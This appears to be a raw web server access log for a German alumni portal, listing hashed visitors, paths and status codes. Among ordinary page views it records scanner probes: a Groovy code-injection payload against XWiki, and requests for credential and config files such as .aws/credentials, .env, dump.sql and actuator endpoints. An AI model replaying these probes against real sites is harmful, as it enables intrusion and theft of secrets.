04e9f6b1fc72f1ece6b68eee435a0b1a4cf7c0e2c62aed7f80c341b8b266c8b6;2025-11-28 04:02:46;/;/;GET;200
a157b969de6223951933c29d5f135a38a53b70aec41e6cc5ec73f1acaefc493d;2025-11-28 04:05:53;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-28 04:09:16;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-28 04:09:17;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-28 04:09:17;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-28 04:09:17;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-28 04:09:45;;/;GET;200
c4ab82e27a48255cb6ca8bfe4e527f7e67f721d4c22acd6c38d1272106c19174;2025-11-28 04:23:40;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-28 04:29:43;/personen/alumni/details/albert-hammig;/aktuelles/meldungen;GET;200
a9a5d728ca440e55c6d81eb856dddedb2945051e63d1b0fdaafed11a8b5bc6ae;2025-11-28 04:30:20;;/assets/jquery-file-upload/server/php/index.php?file=tf2rghf.jpg;GET;404
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-28 04:30:40;/;/;PROPFIND;405
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-28 04:34:53;/;/;GET;200
ee483f6f1190afba4f79979c74e04e0f09481e02c46961abf9e4aa5c66b60e6a;2025-11-28 04:39:12;;/themen/details/david-gegen-goliath;GET;200
0733964c19d2c37462cf5def2bd1b8139811b899e7f511049d1471e45ea365ec;2025-11-28 04:39:50;;/;GET;200
9a48c714727a75520960c4f66663ed2c668e09bf8aebc41f94de94cdfce71045;2025-11-28 04:42:36;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
1c9822d32b0a8a8b15437736bc3f774c94c8c58c1271aa2a944a797c8703153e;2025-11-28 04:59:41;/;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-28 05:04:11;/;/;PROPFIND;405
440155a5262249e187c5e5c938fb11741af48da34374c591733b2a2dca0cc641;2025-11-28 05:05:50;/personen/all/;/personen/all/;GET;301
440155a5262249e187c5e5c938fb11741af48da34374c591733b2a2dca0cc641;2025-11-28 05:05:51;/personen/all;/personen/all;GET;200
4324aa6805bcb9f552a626f712967c4338ab0feaa08730f6a0646df60656de83;2025-11-28 05:09:46;/;/;GET;200
05d04846a66bcf1f4be5d9934a05945269b2782378135ba2d76d4b24ee6af9d3;2025-11-28 05:12:02;;/personen;GET;200
d2ea55659ba875f29403ae9d95eb168d65d2295144b61483fafc0a4c5fb89138;2025-11-28 05:15:10;;/sslvpn_logon.shtml;GET;404
d2ea55659ba875f29403ae9d95eb168d65d2295144b61483fafc0a4c5fb89138;2025-11-28 05:15:10;;/global-protect/login.esp;GET;404
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-28 05:23:36;;/gruppen/hobby/diy-projekte;GET;302
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-28 05:23:37;;/gruppen;GET;200
c82b5c5550a9ac7a09f3b367938646a13e9c25665cc4be74df2732f973a9b273;2025-11-28 05:25:36;;/sitemap.html;GET;404
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-28 05:28:54;/;/;GET;200
92307207a449571858889a34fc63900c5306bf45adf2f3eaf7f1eb351c4c3900;2025-11-28 05:30:26;;/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:03;;/app_dev.php/_profiler/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:04;;/?phpinfo=-1;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:07;;/info/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:09;;/debug/default;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:27;;/config.env;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:29;;/docker-compose.yml;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:30;;/configuration.yaml;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:31;;/api/phpinfo.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:33;;/admin/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:35;;/env.js;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-28 05:31:36;;/static/historypage.js;GET;404
89d822d9b960d5c58dbb8fc7c3ad6922825a0a3775adc2e506b2e08c4762edb1;2025-11-28 05:33:06;/;/;GET;200
be38b96435f9f356e1d63726c477013b15b6199023d4c44c9ecf597e03009b42;2025-11-28 05:34:04;;/;GET;200
4f9cea01b1d5af6737752849a3c01bbcdbfa0b0134ab4f1db35823819367a2c0;2025-11-28 05:37:19;;/gruppen/hobby/einzelsportarten;GET;302
b685dccece193a5885af57af9b8c086dbb21e2487fce445f34419bc44f2c595f;2025-11-28 05:37:40;;/;GET;200
3162bb24dd6ba996026a7aa8fd24241fb39d479add1d9ba664fb1ed8e2210ca2;2025-11-28 05:38:25;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
26f3e27d42de7cb0b3c11e72ea3e610d49b98448e1187ae5b48c4be73e26f722;2025-11-28 05:44:11;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-28 05:48:01;/gruppen/hobby/debattieren;/gruppen/hobby/musikproduktion;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-28 05:48:02;/gruppen/hobby/debattieren;/gruppen;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-28 05:49:23;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/chor;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-28 05:49:24;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
0de2f958718a9b9718882e6c0c9c9c450e0f0fe0505392332b13c46b35000648;2025-11-28 05:50:41;;/personen;GET;200
1d0c72a5edb3f12eda8de2cea607435713d03885c04641956660e66d6043bc62;2025-11-28 05:52:29;;/sitemap.xml;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-28 06:09:11;/personen/alumni/details/albert-hammig;/personen/alumni/schule/4240545;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-28 06:10:34;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/fotobearbeitung;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-28 06:10:35;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
457a06ae2be07054db17ebfbd3ca48db694c56374f72ea8922d30be15881a8c7;2025-11-28 06:15:04;;/personen/all/3;GET;200
800664d81b1ea70652f65a0321881179675d0579f4a6cb564df7e2e5872cb933;2025-11-28 06:23:45;;/;GET;200
85290f67fe86644f7d11f908d0346793cc493806c709b572d2f18651654e3e0e;2025-11-28 06:23:52;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
2fb5811ecf21eb071097deedd7f5a237816d13eb4dac29913cac3a4961bfd392;2025-11-28 06:31:31;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-28 06:33:22;/personen/all/2;/personen/all/5;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-28 06:34:46;/gruppen/hobby/ernahrungswissenschaft;/gruppen/interesse/teamarbeit;GET;200
ce216599bbf5e83c19d99c96482786158ce0824cf41e328932d8682e30a42e8b;2025-11-28 06:43:36;;/.vscode/sftp.json;GET;404
46a256bad355735bd0a910a71608a4983b212bf73fbf8fc182ea56d4a7706463;2025-11-28 06:45:04;;/personen/all/4;GET;200
f20835b7bbd88f62651279df1c2dad8d4733f7f2d7ee866191a181b31e4d9680;2025-11-28 06:49:40;;/personen/alumni/schule/09A05;GET;200
e4b3a3dbd7be011d0bafc1cd96a5b0029a1f1269315ee385a36dffc0f30d4729;2025-11-28 06:50:22;;/sitemap_index.xml;GET;404
110a296d6273f2229d22716bb45e5a1f0574bb29dd1d2728b90a2ad8e1ed36c7;2025-11-28 06:50:53;/;/;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-28 06:53:39;/gruppen/interesse/selbststandigkeit;/personen/alumni/details/benjamin-wagner;GET;200
c1dbcfe1961f7de120b0eaf2fca6a23fbf720046cbb2f4a7b76b5674488c736a;2025-11-28 06:54:37;;/personen/alumni/details/tobi-esche;GET;200
c4dec20a6fd741b0c22fc3fa4f85585fc5e49033f8c84b464dbda0d2029dabba;2025-11-28 06:54:57;;/;GET;200
1ca3e770869dd2f4af2ed7c72bfc451928b4fb762d5782394e065d45bf8c947b;2025-11-28 06:56:20;;/;GET;200
14344eabfdaa0af09eadfea89fd357f5c34ebfaf9f1bd631f7a1484013fd6356;2025-11-28 06:56:27;;/config.json;GET;404
32845091c46979b9633d68afe6114ccdabe2f2cedec9c1e3a7e02b85a373ec55;2025-11-28 07:00:08;;/;GET;200
32845091c46979b9633d68afe6114ccdabe2f2cedec9c1e3a7e02b85a373ec55;2025-11-28 07:04:38;;/webui/;GET;404
c7c22f6e5025a412352c7fb1d6ddabe019caedaba17bb09b1ae0fc5bfdd093de;2025-11-28 07:04:46;;/themen?category=politik;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-28 07:09:16;/gruppen/hobby/ernahrungswissenschaft;/gruppen/interesse/datenanalyse-und-forschung;GET;200
d3243c51bc6adc50c0cba81628eeb129a61a353693fa7d04c66fc677dd98d8c7;2025-11-28 07:09:40;;/;GET;200
da2c52833197dfa23769515cce8e28bb0669d2cb85c8c765e2f9d5925e41c6e2;2025-11-28 07:19:25;;/;GET;200
32845091c46979b9633d68afe6114ccdabe2f2cedec9c1e3a7e02b85a373ec55;2025-11-28 07:21:16;;/geoserver/web/;GET;404
702a5732dbbfd6c9e387a03d7afd1b9acaf0fd9051aadfca66bbe58bfdf30dd2;2025-11-28 07:23:09;;/personen/alumni/details/dilek-keskin;GET;200
b90cfec148519af758ed68612310384cf1c32cd5c24a1738c5416cb9dc423437;2025-11-28 07:24:46;;/htmx/get;GET;405
438c1a568ecfb37776eebcd8d23a8e751c2fd3e4cba356e48568a689aa541cbb;2025-11-28 07:29:06;/;/;GET;200
4c842371c1215c87ebc986259aaffc56063d824273f9bcd7bce51263783c3498;2025-11-28 07:29:23;/sitemap.xml;/sitemap.xml;GET;200
9c48f3bffdae16fbde890197919079b2067cdfa44bf4d24f52c86c576171821f;2025-11-28 07:29:41;;/;GET;200
487ef9bff9640470cfab924ba8874fc07a6e0e7b7aeecb7aaffd89168cf993ae;2025-11-28 07:30:32;;/sitemap.xml;GET;200
4cb1b46f04d224ff027d3e3d3e191bbe1ec93f57c9be3eadfdc296103c951f85;2025-11-28 07:31:03;;/config.json;GET;404
d434b05b4bffcc5dbc96e85c0bbca469321c7ab87e29ec83280cd45bf6058760;2025-11-28 07:36:05;;/personen/alumni/details/joel-schlunder;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-28 07:39:03;/personen/alumni/details/josephine-muller;/gruppen/hobby/politik-und-debatten;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-28 07:39:04;/personen/alumni/details/josephine-muller;/gruppen;GET;200
43b543eb65d081b65e5d432a2113d15bb1d1b4e6a7706dcc2689caa8dd7204e5;2025-11-28 07:39:51;;/ReportServer;GET;404
68dc3c989e6b531ede9c293187f37689d0b20a7704c450e978d5b22427b2ca4f;2025-11-28 07:43:07;;/personen/alumni/details/cynthia-ott;GET;200
baefb152f26544e034ada709f53518e4d9f7b7ab9e32668878ab9f6aa2e1f7fa;2025-11-28 07:43:57;;/personen/all/5;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:36;;/?search=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:38;;/?query=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:42;;/?q=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:47;;/?s=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:51;;/?find=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:54;;/?lookfor=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:47:58;;/?keyword=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:02;;/?text=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:05;;/?term=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:08;;/?kwd=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:13;;/?product=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:16;;/?item=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:20;;/?catalog=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:23;;/?goods=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:28;;/?article=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:32;;/?entry=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:35;;/?title=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:39;;/?desc=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:43;;/?content=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:47;;/?story=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:51;;/?topic=dorktest303;GET;200
a6b43c9d687656f38e6524b13d39510ad8cfcd1d10283451a23adb6446e697b7;2025-11-28 07:48:54;;/?thread=dorktest303;GET;200
5984439a171c341605f861a70d93411e6e76c5ab554e500deda348b8387b38ed;2025-11-28 07:50:04;;/;GET;200
98de58f22dfed6f76585f1f7407a49ebd7dd422114f594f42bfddae40fd3cac5;2025-11-28 07:53:23;;/;GET;200
5984439a171c341605f861a70d93411e6e76c5ab554e500deda348b8387b38ed;2025-11-28 07:56:17;;/security.txt;GET;404
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-28 08:02:57;;/gruppen/hobby/wandern;GET;302
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-28 08:02:59;/gruppen/hobby/wandern;/gruppen;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-28 08:03:37;/;/;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-28 08:03:39;;/;GET;200
6f246e3a3f74087c6f8f7d45d6ee8246290820b03a78b3ff0cc3b2ecc4eeb130;2025-11-28 08:08:44;;/;GET;200
0af89a5367b7ebaa15c34a0cdedbb404bb9e4af42d1a1448d8e8d7d546c77b13;2025-11-28 08:13:28;;/;GET;200
92394453b02b4f8efb5e561f19ee6b51f2847a80761170f558e60d5a0685395b;2025-11-28 08:21:13;;/;GET;200
551a2bfe4085ed17892199ca0e1de6ed06737c7e1a19868ad6a3590227f51a0f;2025-11-28 08:30:29;;/;GET;200
9f6ccdf2128101487f86a81f63b476651fa1dd08f5b23c3efc94e9a415810d43;2025-11-28 08:31:15;/;/;GET;200
a091388303b495ef1b7fcd0f5373ddaf85ee47173c161d3d3dcdba86b9855298;2025-11-28 08:33:59;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
9ca84a0ecac52bfb4cdb853dc83b6b5b244ce2b2ea5b6666cee4cecc138dd231;2025-11-28 08:34:02;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-28 08:46:26;;/?XDEBUG_SESSION_START=phpstorm;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:36;;/imprint;GET;404
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:39;;/;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:41;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:41;;/themen/details/abschied-aus-moabit;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:41;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:42;;/personen;GET;200
651fae04f320ffcd181dba217348390f6f1754e3b6c35d0cb59fb4516aa825a3;2025-11-28 08:50:42;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
0afa02b8904ddd3cbc48314b53987a4dea0abf215edc67498edae07246efd627;2025-11-28 08:50:45;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-28 08:51:42;;/favicon.192x192.png;GET;404
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-28 08:52:08;;/;GET;200
074521a40973e9d5e00805e219101fbf3a4032d7100df7fae537c2781f551598;2025-11-28 08:52:09;;/themen/details/gemeinsam-stark-organisiert;GET;200
b7217d69e8d0115bb190e4e14c6e43253cdf077156dab449d4a7433c7996b23e;2025-11-28 08:52:59;;/admin/config.php;GET;404
18428a84116f8cd8abbd84d94f57800636a899f4952a1dfab4c803302653ab21;2025-11-28 08:53:07;;/personen;GET;200
afc48608d23bff368b4669dcf9faba3e2fe9dcbff3edfdf8328dee6050fe21a0;2025-11-28 08:54:27;;/;GET;200
c929ee95730ba6ef1ee48df48ee60b2a042192c5b52fb38566d40c91ed8cce13;2025-11-28 09:11:57;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
03040fc47888d54a386842adb7233482b366d303a945cc398eabdbd59f3b4fc0;2025-11-28 09:15:23;;/;GET;200
551a2bfe4085ed17892199ca0e1de6ed06737c7e1a19868ad6a3590227f51a0f;2025-11-28 09:18:52;;/;GET;200
4344cc696b0c5bde826db46baed1e511923fae9e97b16573f245084ae6a9fd07;2025-11-28 09:26:13;;/;GET;200
26e892606cd92d684af75b6252a9a3fed4476423e6900ba164a52b3d65f5221c;2025-11-28 09:31:55;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
a15d0299167e1cc2eb56c724516b950ab84bcb7f8a454e3353eb5707fcc4a8bc;2025-11-28 09:34:15;/;/;GET;200
e4c34f58cf62101e067f93fa39325c2a42fe4375e072be7f2e3fd2b9e63c3dfa;2025-11-28 09:35:54;;/components/com_sexycontactform/fileupload/index.php?file=tf2rghf.jpg;GET;404
6bf2faf0dd32fb6e3fcd8d18f10e8034591240600b1c99bd37477be1ecd95d0b;2025-11-28 09:40:43;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
316eefdf1ed4bdfc59e5e0ec5320cae11e138da8a44ef6b593d4f8193cfe3fd8;2025-11-28 09:49:27;;/;GET;200
da3b98fa1999aa860bccfbce0cc14539925687f3c6ffc4061a42c93d80c45431;2025-11-28 09:50:55;;/personen/alumni/schule/9009;GET;200
7767349253901554bea2940a0e7797e725a93d228ed9b35e23014ee0c70d25ea;2025-11-28 09:52:47;/admin;/admin;GET;302
7767349253901554bea2940a0e7797e725a93d228ed9b35e23014ee0c70d25ea;2025-11-28 09:52:47;/admin;/login;GET;200
a2621d39c3bc631c2257d86d91d8f43e072c7fb919691ea3babd7cdb308b4037;2025-11-28 09:54:03;;/themen/details/hackerangriff-lauft-ins-leere;GET;200
11b9c12ee2382a7db1bc816b512f200420de4f836530fddcb2104ad6be11ac7c;2025-11-28 09:57:55;/;/;GET;200
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-28 09:59:33;;/;GET;200
904ee9d9a5d60438e018385113a9c1b46c0cdcabaffbb860e5424c934589c8fd;2025-11-28 10:01:21;;/;GET;200
043032b99a23b3a88656953cf3dab7687cfd02c4fa784ff45f351a37132bec1c;2025-11-28 10:08:20;/.aws/credentials;/.aws/credentials;GET;404
5bf83b1ec0776184b543dec0d1d5cd15331529c041296b03bedf10cd82199a8b;2025-11-28 10:08:35;/config.php;/config.php;GET;404
b2672066c8d0c855807aac910f1b642afe20792c6f04fcd449fa04bfbd644128;2025-11-28 10:08:36;/config.json;/config.json;GET;404
e753c09926441e5d8524eec1726cab934502c59997e3756593bc44dbd4907396;2025-11-28 10:08:54;/application.yml;/application.yml;GET;404
d4c0f9bc08022754717d32e0580bd9d6757bddbb564c917e5135459a3727628b;2025-11-28 10:09:11;/docker-compose.yaml;/docker-compose.yaml;GET;404
1171a83022c2ba36294de7d80314aec33b4215c3decd0adaa9fd42290837a8e8;2025-11-28 10:09:15;/actuator/env;/actuator/env;GET;404
463fb6432161813ff819183fc0ff6315239aea497edf8a921bc2483ee62f3812;2025-11-28 10:09:16;/actuator/configprops;/actuator/configprops;GET;404
6083f69c22aa2538bf681e5728330ff3c2a42d304e2dcbbfa74c989478ab19cc;2025-11-28 10:09:20;/env;/env;GET;404
f938a195beb781b942e7870260ea385fea0e3c28065eecab8a0a8671a35290b6;2025-11-28 10:09:41;/dump.sql;/dump.sql;GET;404
c993a1a9cacd2a3c1a11737ecb0211762bbe3254a33864fa0adcb52fd4db1dd6;2025-11-28 10:09:42;/database.sql;/database.sql;GET;404
8b981d1c93d549da64cee9785d36082e2125095dc6ea51e61f86b4145cbf4623;2025-11-28 10:15:57;;/personen;GET;200
ca579618a5d0aabb4f3e09e9f7d2ec946f47d94c51499028437cbfc85170e288;2025-11-28 10:17:57;;/;GET;200
8b89e5fa4515e50ad82e7ad75af6d5397ee7a9a0054652c29757598376f26df1;2025-11-28 10:18:35;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
e2ab3e1bba868d2672759e2515c85027b91f263efe0e0ad1c1505d95cbb72e64;2025-11-28 10:20:23;;/;GET;200
86e36026d534d7d55aa71326f1e6cf1d66374546e1be7de78e9751ff71985973;2025-11-28 10:35:17;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-28 10:42:47;;/actuator/gateway/routes;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:03;;/_profiler/phpinfo;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:03;;/php_info.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:03;;/test.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:05;;/phpinfo.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:05;;/info.php;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:05;;/phpinfo;GET;404
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:06;;/;GET;200
1c455ceb9654c10e7e0135c826878adc8730b6ceda9e8e28914fadaab18a61ab;2025-11-28 10:50:07;;/js;GET;404
39394126870247a30c2942dd4ebb4eb97b2aac2b1c2c062d958eaec98c357fb7;2025-11-28 10:54:39;;/;GET;200
8cb3c8ed5b66ab64dc616b4bbe4736c016fd3f4dc29ef76c57bcc83210abaa80;2025-11-28 10:57:20;;/docs/software/php-ide.md;GET;404
4e5937c56de9e6d7fc7e598c76a22934757f45bf9bdfbf32a266f8cd9bbcf6da;2025-11-28 10:57:47;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:45;;/+CSCOL+/Java.jar;GET;404
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:46;;/+CSCOE+/logon_forms.js;GET;404
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:47;;/+CSCOL+/a1.jar;GET;404
357657664c858e6e68d48462806fc876122d5223cd670790bf14a937d3994dce;2025-11-28 11:02:48;;/+CSCOE+/transfer.js;GET;404
c34ccf853cdbcb94d063e8b0338ae4791108e6ba11591d1afa2318497acc0471;2025-11-28 11:02:54;;/personen/all/5;GET;200
e2ab3e1bba868d2672759e2515c85027b91f263efe0e0ad1c1505d95cbb72e64;2025-11-28 11:10:02;;/;GET;200
68d397a878f2c49af88decba26fda3cdf81ba0983e2949025838cea8a473a2b0;2025-11-28 11:12:51;;/;GET;200
68d397a878f2c49af88decba26fda3cdf81ba0983e2949025838cea8a473a2b0;2025-11-28 11:12:52;;/;GET;200
4d2285947bcae30809504cb77443a01f4da7ba7e41c46ad6c15c7432a9ec7bb7;2025-11-28 11:31:50;/sitecore/shell/sitecore.version.xml;/sitecore/shell/sitecore.version.xml;GET;404
4d7147f496550a5dbd884d6b4c9a4bad79195da02626891efb212d05cf6f6fd1;2025-11-28 11:33:33;;/;GET;200
3d778385e0821a0b89798cc244afbff10609842c2226838ad47ffb8806b6c8e1;2025-11-28 11:35:47;/media/system/js/core.js;/media/system/js/core.js;GET;404
3d778385e0821a0b89798cc244afbff10609842c2226838ad47ffb8806b6c8e1;2025-11-28 11:35:47;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
3d26494895aaa3ae4077e977c5fb6c5aaa3f3358278d96649fd7bdb53ebd0775;2025-11-28 11:41:14;;/;GET;200
18465003bf08a02c148c944121bcfffef736ca74d9737b3448024c28f0896ed6;2025-11-28 11:44:49;;/personen/alumni/schule/MP001;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:05;;/imprint;GET;404
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:06;;/;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:08;;/themen/details/abschied-aus-moabit;GET;200
a0ae96a1ad695cb5e517cac1c092778731ea51792e7e1ac1058a489f25c493a4;2025-11-28 12:00:08;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
